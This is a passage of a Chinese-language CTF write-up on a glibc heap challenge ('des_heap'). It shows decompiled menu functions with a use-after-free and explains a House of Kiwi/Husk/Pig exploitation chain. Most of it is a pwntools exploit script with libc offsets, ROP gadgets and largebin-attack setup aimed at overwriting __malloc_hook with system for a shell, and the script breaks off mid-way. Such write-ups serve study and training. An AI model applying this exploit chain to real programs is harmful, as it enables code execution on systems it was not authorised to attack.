class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_14A9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Edit"><a class="header-anchor" href="#Edit">Â¶</a>Edit</h4><p>åªè¦åœ¨ mmap åˆ†é…çš„å †ä¸Šï¼ŒğŸ‘´ æƒ³ edit å“ªé‡Œï¼Œå°± edit å“ªé‡Œã€‚ä¸»è¦è¿™ä¸ª <strong>my_read</strong> é‡åˆ° <strong>â€˜\x0aâ€™</strong> ä¼šæˆªæ–­ï¼Œç¨å¾®æ³¨æ„ä¸€ä¸‹å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1513</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x1000</span> )<br>    error(<span class="hljs-string">&quot;Invalid size Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;offset: &quot;</span>, <span class="hljs-number">8uLL</span>);<br>  v2 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &gt;= <span class="hljs-number">0x2000</span> )<br>    error(<span class="hljs-string">&quot;Invalid offset Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  my_read(v2 + Heap_arena, v1);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Edit done\n&quot;</span>, <span class="hljs-number">0xA</span>uLL);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Dele"><a class="header-anchor" href="#Dele">Â¶</a>Dele</h4><p>åªè¦åœ¨ mmap åˆ†é…çš„å †ä¸Šï¼ŒğŸ‘´ æƒ³ free å“ªé‡Œï¼Œå°± free å“ªé‡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Free</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;idx: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0x3000</span> )<br>    error(<span class="hljs-string">&quot;Invalid idx Receviced&quot;</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)(Heap_arena + v1));<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Show"><a class="header-anchor" href="#Show">Â¶</a>Show</h4><p>leak çš„æ˜¯ buf å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ calloc çš„å †å—ã€‚å¯¹æˆ‘ä»¬çš„å †å¸ƒå±€æå‡ºäº†ä¸€äº›è¦æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1688</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  v1 = <span class="hljs-built_in">strlen</span>(buf);<br>  write(<span class="hljs-number">1</span>, buf, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exp-Kiwi-Husk-Pig-æˆé“¾"><a class="header-anchor" href="#Exp-Kiwi-Husk-Pig-æˆé“¾">Â¶</a>Exp.Kiwi -&gt; Husk -&gt; Pig æˆé“¾</h3><p>2.33 è¿˜æ˜¯æœ‰ hook çš„ï¼ŒPig æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p><p><strong>æ€è·¯ä»‹ç»</strong></p><ol><li>ç®€å•å¸ƒä¸ªå±€ï¼Œæœ‰ UAF æˆ‘ä»¬å¾ˆå®¹æ˜“åœ° leak å‡º libcã€‚</li><li>å†ç®€å•çš„æ‹¿ä¸ªå †åœ°å€ï¼Œæ•´å®Œäº‹å°±æŠŠå †æ¢å¤å›å»ï¼Œèµ·ç ä¸è¦å¸¦ä¸ª unsorted ä¸€ç›´ç©ï¼Œå®¹æ˜“å‡ºäº‹ã€‚</li><li>æ„é€ å‡ºåŒä¸€ idx ä¸‹çš„ Largebin å’Œ Unsortedbinï¼Œä¸º Largebin Attack ä½œå‡†å¤‡ã€‚</li><li>Largebin Attack å¼€å§‹ä¹± ğŸ‘ ï¼Œé€šå¸¸å¥½ä¸€ç‚¹çš„å¸ƒå±€åœ¨æœ‰ Edit çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å®ç°å¤šæ¬¡ Largebin Attakï¼ŒğŸ‘´ è¿™æ˜¯é€šå¸¸å¸ƒå±€æ‰€ä»¥å¤šæ¬¡â‘§æ˜¯é—®é¢˜ã€‚</li><li>å…ˆæ‰“å®Œ husk çš„ä¿©å¼ è¡¨ï¼Œåœ¨å¯¹åº”åç§»å¤„å†™ exit å‡½æ•°ã€‚ğŸ‘´ è¿™é‡Œæ‹¿çš„æ˜¯ <strong>%s</strong> ä¹Ÿå°±æ˜¯ $hex(ord(â€˜sâ€™)*8)=0x398$ ã€‚ä½ æ‹¿ <strong>%u</strong> ä¹Ÿå°±æ˜¯ <strong>0x3a8</strong> ä¹Ÿå½³äºã€‚</li><li>æ‰“ _IO_list_allï¼Œå¾…ä¼šå¸ƒç½® _IO_FILE é“¾å­ã€‚</li><li>æ‰“ main_arena çš„ topchunk ï¼Œå¦‚æœä½ æƒ³çš„è¯ï¼Œå» leak å‡ºçœŸæ­£çš„å †åœ°å€ï¼Œç„¶åé”™ä½æ‰“ size ï¼Œä¹Ÿ â‘§ æ˜¯ä¸å½³äºã€‚</li><li>åˆ†é…ä¸€ä¸ªå¤§å †å—ï¼Œ<strong>Kiwi</strong> é‡Œçš„ <strong>vfprintf</strong> å¯ä»¥è§¦å‘ <strong>Husk</strong> è¿›å…¥ <strong>exit</strong>ï¼Œç„¶ååœ¨  <strong>_IO_flush_all_lockp</strong> éå†æˆ‘ä»¬çš„ IO é“¾å­ï¼Œå®ç° <strong>Pig</strong> çš„æ‰‹æ³•ã€‚</li></ol><p><strong>IO é“¾è§£é‡Š</strong></p><p>ğŸ‘´ å»ºè®®å¸¦ ğŸ”¥ ä»”ç»†è·Ÿä¸€ä¸‹ <strong>_IO_str_overflow</strong> çš„æ±‡ç¼–å’Œæºç ã€‚</p><ol><li>è¿™é‡Œä¸»è¦æ˜¯ç”¨åˆ°äº† <strong>_IO_str_overflow</strong> é‡Œçš„éé¢„æœŸ <strong>malloc</strong> å †å—å’Œ <strong>memcpy</strong>ï¼Œç»“åˆæˆ‘ä»¬çš„ <strong>TcachePoisoning</strong>ï¼Œå¤šæ¬¡åˆ©ç”¨è¿™ä¸ª trickï¼Œè¾¾åˆ°äº†ä»»æ„å†™çš„åŠŸèƒ½ã€‚ğŸ‘´ è¿™é‡Œæ‰¬æ‰äº† <strong>__malloc_hook</strong> ã€‚</li><li><strong>_IO_str_overflow</strong> å‡½æ•°ä¸­ä¼šå°†æˆ‘ä»¬ IO ç»“æ„ä½“çš„ <strong>_IO_write_ptr</strong> æ”¾åˆ° <strong>rdx</strong>ï¼Œåˆ©äºé«˜ç‰ˆæœ¬ä¸‹çš„ <strong>setcontext+61</strong> çš„ç»•æ²™ç›’æ“ä½œã€‚</li><li>å› ä¸ºè¿™é¢˜æ²¡å¼€æ²™ç®±ï¼Œè¿™é‡Œåœ¨å †åœ°å€ä¸Šå†™ <code>/bin/sh\0</code>ï¼Œåœ¨ <strong>__malloc_hook</strong> å†™ systemï¼ŒæŠŠ <strong>malloc</strong> çš„ size æ§åˆ¶æˆ $(bin_sh-100)//2$ å°±å¯ä»¥ <strong>getshell</strong>ã€‚ æ ˆè¿ç§»åç»å…¸ <strong>pop rdi,ret;bin_sh;system;</strong> çš„å¸ƒå±€å½“ç„¶ä¹Ÿæ˜¯æ¬§å°…çš„ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,28897)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack 